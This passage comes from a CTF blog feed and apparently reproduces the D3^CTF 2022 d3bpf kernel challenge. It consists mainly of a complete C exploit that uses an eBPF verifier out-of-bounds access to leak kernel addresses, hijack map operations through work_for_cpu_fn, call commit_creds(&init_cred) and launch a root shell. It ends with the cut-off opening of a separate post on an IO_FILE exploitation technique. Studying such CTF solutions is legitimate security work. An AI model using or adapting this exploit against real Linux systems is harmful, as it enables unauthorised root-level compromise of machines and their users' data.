class="function"><span class="keyword">int</span> <span class="title">create_map</span><span class="params">(<span class="keyword">union</span> bpf_attr *map_attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_CREATE, map_attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">update_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value, <span class="keyword">uint64_t</span> flags)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    attr.flags = flags;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lookup_map_element</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">uint64_t</span> key, <span class="keyword">void</span> *value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;&#125;;</span><br><span class="line">    attr.map_fd = fd;</span><br><span class="line">    attr.key = (<span class="keyword">uint64_t</span>)&amp;key;</span><br><span class="line">    attr.value = (<span class="keyword">uint64_t</span>)value;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">obj_get_info_by_fd</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_OBJ_GET_INFO_BY_FD, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">map_get_next_key</span><span class="params">(<span class="keyword">union</span> bpf_attr *attrs)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, attrs);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">run_bpf_prog</span><span class="params">(struct bpf_insn *insn, <span class="keyword">uint32_t</span> cnt, <span class="keyword">int</span> *prog_fd_out)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> prog_fd = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">char</span> verifier_log_buff[<span class="number">0x200000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> socks[<span class="number">2</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">prog_attrs</span> =</span></span><br><span class="line">        &#123;</span><br><span class="line">            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,</span><br><span class="line">            .insn_cnt = cnt,</span><br><span class="line">            .insns = (<span class="keyword">uint64_t</span>)insn,</span><br><span class="line">            .license = (<span class="keyword">uint64_t</span>) <span class="string">&quot;&quot;</span>,</span><br><span class="line">            .log_level = <span class="number">2</span>,</span><br><span class="line">            .log_size = <span class="keyword">sizeof</span>(verifier_log_buff),</span><br><span class="line">            .log_buf = (<span class="keyword">uint64_t</span>)verifier_log_buff&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = *prog_fd_out;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt;= prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        prog_fd = bpf(BPF_PROG_LOAD, &amp;prog_attrs);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> &gt; prog_fd)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(verifier_log_buff);</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != socketpair(AF_UNIX, SOCK_DGRAM, <span class="number">0</span>, socks))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != setsockopt(socks[<span class="number">0</span>], SOL_SOCKET, SO_ATTACH_BPF, &amp;prog_fd, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0x7</span> != write(socks[<span class="number">1</span>], <span class="string">&quot;zzzzzzz&quot;</span>, <span class="number">7</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> done;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != prog_fd_out)</span><br><span class="line">    &#123;</span><br><span class="line">        *prog_fd_out = prog_fd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        close(prog_fd);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">done:</span><br><span class="line">    close(socks[<span class="number">0</span>]);</span><br><span class="line">    close(socks[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_sp, user_rflags;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">err_exit</span><span class="params">(<span class="keyword">char</span> *err_msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(err_msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (getuid())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m\n&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EXP_REG BPF_REG_8</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OOB_REG BPF_REG_7</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STORE_REG BPF_REG_6</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> attack(oob_map_fd, store_map_fd)                                     \</span></span><br><span class="line"><span class="meta">    BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),                                    \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(OOB_REG, BPF_REG_0),                                   \</span></span><br><span class="line"><span class="meta">        BPF_LD_MAP_FD(BPF_REG_1, store_map_fd),                              \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_0, 0),                                         \</span></span><br><span class="line"><span class="meta">        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),                       \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),                                \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),                               \</span></span><br><span class="line"><span class="meta">        BPF_RAW_INSN(BPF_JMP | BPF_CALL, 0, 0, 0, BPF_FUNC_map_lookup_elem), \</span></span><br><span class="line"><span class="meta">        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),                               \</span></span><br><span class="line"><span class="meta">        BPF_EXIT_INSN(),                                                     \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(STORE_REG, BPF_REG_0),                                 \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(BPF_REG_9, 64),                                        \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_IMM(EXP_REG, 1),                                           \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_RSH, EXP_REG, BPF_REG_9),                          \</span></span><br><span class="line"><span class="meta">        BPF_MOV64_REG(BPF_REG_0, EXP_REG),                                   \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_ADD, OOB_REG, 0x1000),                             \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_IMM(BPF_MUL, BPF_REG_0, 0x1000 - 1),                       \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, BPF_REG_0),                          \</span></span><br><span class="line"><span class="meta">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> setup_btf_bpf_prog_fd;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">int</span> oob_map_fd, <span class="keyword">int</span> store_map_fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> addr, <span class="keyword">char</span> *buf, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">char</span> values[<span class="number">0x1500</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops_content</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0xD0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">8</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_MOV64_IMM(BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; len / <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">bpf_map_info_kernel</span> <span class="title">info</span> =</span> &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">            .info.bpf_fd = oob_map_fd,</span><br><span class="line">            .info.info = (<span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;info,</span><br><span class="line">            .info.info_len = <span class="keyword">sizeof</span>(info)&#125;;</span><br><span class="line"></span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = addr - <span class="number">0x58</span>;</span><br><span class="line">        <span class="keyword">if</span> (addr == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            ((<span class="keyword">uint64_t</span> *)&amp;values[<span class="number">8</span>])[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops_content, <span class="keyword">sizeof</span>(read_map_ops_content) / <span class="keyword">sizeof</span>(read_map_ops_content[<span class="number">0</span>]), &amp;setup_btf_bpf_prog_fd))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="number">0</span> != obj_get_info_by_fd(&amp;attr))</span><br><span class="line">        &#123;</span><br><span class="line">            err_exit(<span class="string">&quot;[-] Failed to get map info\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        addr = addr + <span class="number">4</span>;</span><br><span class="line">        ((<span class="keyword">uint32_t</span> *)buf)[i] = info.btf_id;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> raw_array_map_ops = <span class="number">0xffffffff820363a0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_addr;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_base;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// save_status();</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">map_attr</span> =</span> &#123;</span><br><span class="line">        .map_type = BPF_MAP_TYPE_ARRAY,</span><br><span class="line">        .key_size = <span class="keyword">sizeof</span>(<span class="keyword">int</span>),</span><br><span class="line">        .value_size = <span class="number">0x1500</span>,</span><br><span class="line">        .max_entries = <span class="number">1</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> store_map_fd = create_map(&amp;map_attr);</span><br><span class="line">    <span class="keyword">int</span> oob_map_fd = create_map(&amp;map_attr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (store_map_fd &lt; <span class="number">0</span> || oob_map_fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;Failed to create map\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *values = <span class="built_in">malloc</span>(<span class="number">0x3000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ops[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">memset</span>(values, <span class="number">0</span>, <span class="keyword">sizeof</span>(values));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_ops</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_ops, <span class="keyword">sizeof</span>(read_map_ops) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> array_map_ops = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    kernel_offset = array_map_ops - raw_array_map_ops;</span><br><span class="line">    kernel_base = <span class="number">0xffffffff81000000</span> + kernel_offset;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> modprobe_path_addr = <span class="number">0x1a6c240</span> + kernel_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> work_for_cpu_fn_addr = kernel_offset + <span class="number">0xffffffff810bc190</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> commit_creds_addr = kernel_offset + <span class="number">0xffffffff810cce30</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> init_creds_addr = kernel_offset + <span class="number">0xffffffff82a6b880</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;array_map_ops_addr =&gt; %p\n&quot;</span>, array_map_ops);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_base =&gt; %p\n&quot;</span>, kernel_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;kernel_offset =&gt; %p\n&quot;</span>, kernel_offset);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;modprobe_path =&gt; %p\n&quot;</span>, modprobe_path_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;work_for_cpu_fn =&gt; %p\n&quot;</span>, work_for_cpu_fn_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;commit_creds_addr =&gt; %p\n&quot;</span>, commit_creds_addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;init_creds_addr =&gt; %p\n&quot;</span>, init_creds_addr);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">read_map_addr</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span> - <span class="number">0xc0</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, OOB_REG, <span class="number">0</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, STORE_REG, BPF_REG_0, <span class="number">8</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(read_map_addr, <span class="keyword">sizeof</span>(read_map_addr) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != lookup_map_element(store_map_fd, <span class="number">0</span>, values))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to lookup map element\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_ptr = ((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(&amp;values[<span class="number">8</span>]))[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;map_ptr =&gt; %p\n&quot;</span>, map_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;gap =&gt; %p\n&quot;</span>, (modprobe_path_addr - map_ptr));</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> map_value = map_ptr - <span class="number">0xc0</span> + <span class="number">0x110</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 0x79706f432f00</span></span><br><span class="line"></span><br><span class="line">    read_kernel(oob_map_fd, store_map_fd, array_map_ops, values, <span class="number">0xf0</span>);</span><br><span class="line"></span><br><span class="line">    *((<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(values + <span class="number">8</span> * <span class="number">4</span>)) = work_for_cpu_fn_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(oob_map_fd, <span class="number">0</span>, values, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;get_ops!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">bpf_insn</span> <span class="title">modify_oob_map</span>[] =</span> &#123;</span><br><span class="line">        attack(oob_map_fd, store_map_fd),</span><br><span class="line">        BPF_ALU64_IMM(BPF_MUL, EXP_REG, <span class="number">0x110</span>),</span><br><span class="line">        BPF_ALU64_REG(BPF_SUB, OOB_REG, EXP_REG),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x20</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x20</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x28</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0x28</span>),</span><br><span class="line">        BPF_LDX_MEM(BPF_DW, BPF_REG_0, STORE_REG, <span class="number">0x30</span>),</span><br><span class="line">        BPF_STX_MEM(BPF_DW, OOB_REG, BPF_REG_0, <span class="number">0</span>),</span><br><span class="line">        BPF_EXIT_INSN()&#125;;</span><br><span class="line"></span><br><span class="line">    ops[<span class="number">4</span>] = commit_creds_addr;</span><br><span class="line">    ops[<span class="number">5</span>] = init_creds_addr;</span><br><span class="line">    ops[<span class="number">6</span>] = map_value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != update_map_element(store_map_fd, <span class="number">0</span>, ops, BPF_ANY))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] failed to update map element values!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="number">0</span> != run_bpf_prog(modify_oob_map, <span class="keyword">sizeof</span>(modify_oob_map) / <span class="keyword">sizeof</span>(struct bpf_insn), <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        err_exit(<span class="string">&quot;[-] Failed to run bpf program\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] updated oob_map&quot;</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> key = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> next_key;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> <span class="title">bpf_attr</span> <span class="title">attr</span> =</span> &#123;</span><br><span class="line">        .map_fd = oob_map_fd,</span><br><span class="line">        .key = &amp;key,</span><br><span class="line">        .next_key = &amp;next_key&#125;;</span><br><span class="line">    map_get_next_key(&amp;attr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] commit_cred(&amp;init_cred) done!\n&quot;</span>);</span><br><span class="line">    get_shell();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230106194449337.png"                      alt="image-20230106194449337"                ></p><hr><p>题目放在: <a class="link"   href="https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip" >https://github.com/196082/196082/blob/main/kernel_pwn/d3bpf.zip<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;虽然在之前出过几篇关于bpf的文章，但是我并没有得到很深层次的理解，文章的exp基本就是copy的。并且，D3^CTF 2022还有两道ebpf需要复现，所以现在就选择了复现一下。&lt;/p&gt;
&lt;h2 id=&quot;题目分析&quot;&gt;&lt;a href=&quot;#题目分析&quot; class=&quot;heade</summary>
      
    
    
    
    <category term="kernel-pwn" scheme="https://cv196082.gitee.io/categories/kernel-pwn/"/>
    
    
    <category term="ebpf" scheme="https://cv196082.gitee.io/tags/ebpf/"/>
    
  </entry>
  
  <entry>
    <title>house of lalala</title>
    <link href="https://cv196082.gitee.io/2022/12/01/house-of-lalala/"/>
    <id>https://cv196082.gitee.io/2022/12/01/house-of-lalala/</id>
    <published>2022-12-01T05:45:58.000Z</published>
    <updated>2022-12-01T05:45:28.861Z</updated>
    
    <content type="html"><![CDATA[<p>近期又出现一个新的关于<code>IO_FILE</code>的利用方式，不过原作者并没有出名字但是我blog又是用house of系列分类的所以就先随便取个名字。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>此次聚焦的vtable表为:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* the jump table.  */</span></span><br><span class="line"><span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> _<span class="title">IO_obstack_jumps</span> <span class="title">libio_vtable</span> <span class="title">attribute_hidden</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, <span class="literal">NULL</span>),</span><br><span class="line"> 